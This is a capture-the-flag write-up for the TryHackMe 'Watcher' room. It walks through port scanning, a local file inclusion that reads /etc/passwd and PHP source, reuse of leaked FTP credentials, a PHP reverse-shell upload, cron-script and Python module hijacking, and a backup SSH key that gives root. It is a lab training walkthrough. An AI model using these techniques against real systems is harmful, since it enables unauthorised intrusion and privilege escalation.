# [Watcher](https://tryhackme.com/room/watcher)

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Fri Dec 10 16:21:21 2021 as: nmap -vvv -p 22,21,80 -sCV -oA init -Pn 10.10.223.83

Nmap scan report for box.ip (10.10.223.83)
Host is up, received user-set (0.21s latency).
Scanned at 2021-12-10 16:21:22 +07 for 15s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 10 16:21:37 2021 -- 1 IP address (1 host up) scanned in 16.04 seconds
```

We have FTP, SSH, and a web server. We can try anonymous login on FTP but it doesn't work, so we just go to the web server on port 80.

Looking at `robots.txt`, we have a couple of files.

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

We can grab flag 1. As for `secret_file_do_not_read.txt`, trying to access it gives us a 403 Forbidden error so we'll have to come back to it later.

Looking at the page, `post.php` tells us this is a PHP server so we run `gobuster` with that extension.

```sh
/index.php            (Status: 200) [Size: 4826]
/post.php             (Status: 200) [Size: 2422]
/css                  (Status: 200) [Size: 1161]
/round.php            (Status: 200) [Size: 3440]
/bunch.php            (Status: 200) [Size: 3445]
/server-status        (Status: 403) [Size: 271]
```

The page `post.php` takes in a `post` parameter and gives us the corresponding file. We can use this to exploit LFI (Local File Inclusion) by specifying a file in the `post` parameter. We can easily grab `/etc/passwd`.

```
http://box.ip/post.php?post=/etc/passwd
```

We can also grab PHP files by using a base64-encoding filter.

```
http://box.ip/post.php?post=php://filter/convert.base64-encode/resource=index.php
```

However, `index.php` and `post.php` don't contain interesting new information. `/etc/passwd` does give us 3 non-root users with shells: `will`, `mat`, and `toby`. I also tried using `expect://` to get code execution but that doesn't work. We can also get the previously inaccessible `secret_file_do_not_read.txt`

```
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

We have FTP credentials. After logging in, we can grab `flag_2.txt`. There's also the `files` directory but that's empty. However, we do know that it should be the directory `/home/ftpuser/ftp/files` on the machine so we can upload files. In this case, I uploaded a PHP reverse shell, set up a listener, and made a request to `http://box.ip/post.php?post=/home/ftpuser/ftp/files/shell.php` to get a shell on the machine as `www-data`.

Looking at `/var/www/html`, we have the directory `more_secrets_a9f10a` inside which we have flag 3. Looking at the home directories ...

```sh
www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls -la /home/*
/home/ftpuser:
total 12
dr-xr-xr-x 3 root   root    4096 Dec  3  2020 .
drwxr-xr-x 6 root   root    4096 Dec  3  2020 ..
dr-xr-xr-x 3 nobody nogroup 4096 Dec  3  2020 ftp

/home/mat:
total 312
drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
drwxr-xr-x 6 root root   4096 Dec  3  2020 ..
lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
drwxrwxr-x 2 will will   4096 Dec  3  2020 scripts

/home/toby:
total 44
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
drwxr-xr-x 6 root root 4096 Dec  3  2020 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 toby toby  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 toby toby 3771 Dec  3  2020 .bashrc
drwx------ 2 toby toby 4096 Dec  3  2020 .cache
drwx------ 3 toby toby 4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 toby toby 4096 Dec  3  2020 .local
-rw-r--r-- 1 toby toby  807 Dec  3  2020 .profile
-rw------- 1 toby toby   21 Dec  3  2020 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt

/home/will:
total 36
drwxr-xr-x 5 will will 4096 Dec  3  2020 .
drwxr-xr-x 6 root root 4096 Dec  3  2020 ..
lrwxrwxrwx 1 will will    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 will will  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Dec  3  2020 .bashrc
drwx------ 2 will will 4096 Dec  3  2020 .cache
drwxr-x--- 3 will will 4096 Dec  3  2020 .config
drwx------ 3 will will 4096 Dec  3  2020 .gnupg
-rw-r--r-- 1 will will  807 Dec  3  2020 .profile
-rw-r--r-- 1 will will    0 Dec  3  2020 .sudo_as_admin_successful
-rw------- 1 will will   41 Dec  3  2020 flag_6.txt
```

We see that toby, mat, and will have flags 4,5, and 6 respectively, so we know we have to escalate to those 3 users in that order.

Checking our privileges as `www-data` ...

```sh
www-data@watcher:/home/toby/jobs$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

... we see that we're able to run any command as toby without a password so we run `sudo -u toby bash` to get a shell as toby and grab flag 4.

Looking at toby's home, we have `note.txt` and the directory `jobs`.

```sh
toby@watcher:~$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

We see in the note from mat that have some cron jobs running so we'll probably need to exploit them next. Looking at `/etc/crontab` ...

```sh
toby@watcher:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

... we see that `/home/toby/jobs/cow.sh` is being run regularly as mat, and we can write to that file so we replace its content with a reverse shell, set up a listener and get a shell as mat. After that, we can grab flag 5 from mat's home.

In mat's home, we have a `note.txt`.

```sh
mat@watcher:~$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Checking our `sudo` privileges ...

```sh
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

We see that `/home/mat/scripts/will_script.py` can be run as will on a wild card. Checking `will_script.py` ...

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
```

... we see that the `cmd` module is imported. We also have `cmd.py` in the same directory so we also check it out.

```python
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
```

So `cmd.py` essentially whitelists a few commands we can run.

```sh
mat@watcher:~/scripts$ ls -l
total 8
-rw-r--r-- 1 mat  mat  133 Dec  3  2020 cmd.py
-rw-r--r-- 1 will will 208 Dec  3  2020 will_script.py
```

We can't change `will_script.py` since it's owned by will and we don't have writing permission. However, we can write to `cmd.py` which is imported by `will_script.py`. We can simply replace its content with a shell ...

```python
import os

os.system('/bin/bash')
```

... and run the allowed `sudo` command as will to get a shell as will.

```sh
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

After grabbing flag 6, we can check our `sudo` privileges but running `sudo` requires a password this time so no luck there.

Looking in `/opt`, we have the directory `/backups`, inside which is the file `key.b64`. Base64-decoding the file gives us what looks like an SSH key. We can use this key to SSH in as root and grab the final flag, rooting the machine.
